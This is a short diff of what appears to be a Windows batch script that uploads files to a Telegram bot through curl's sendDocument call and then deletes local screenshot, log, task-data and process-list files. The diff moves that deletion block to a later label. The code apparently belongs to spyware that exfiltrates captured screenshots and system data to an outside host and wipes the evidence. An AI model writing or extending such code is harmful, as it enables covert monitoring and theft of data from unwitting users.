@@ -1467,12 +1467,6 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
 echo Message sent to chat ID %CHAT_ID%
 echo Sent.
 
-del /f /q "%USERPROFILE%\Downloads\screenshot.png"
-del /f /q "%LOGFILE1%"
-del /f /q "%TASKS_DATA%"
-del /f /q "%ProcessTXTFILE%"
-
-
 set "currentMinute=%time:~3,2%"
 
 set "CheckSend=0"
@@ -1485,6 +1479,10 @@ set "lastMinute=%currentMinute%"
 
 
 :NEXT2
+del /f /q "%USERPROFILE%\Downloads\screenshot.png"
+del /f /q "%LOGFILE1%"
+del /f /q "%TASKS_DATA%"
+del /f /q "%ProcessTXTFILE%"
 del /f /q "%InstalledQWB%"
 
 
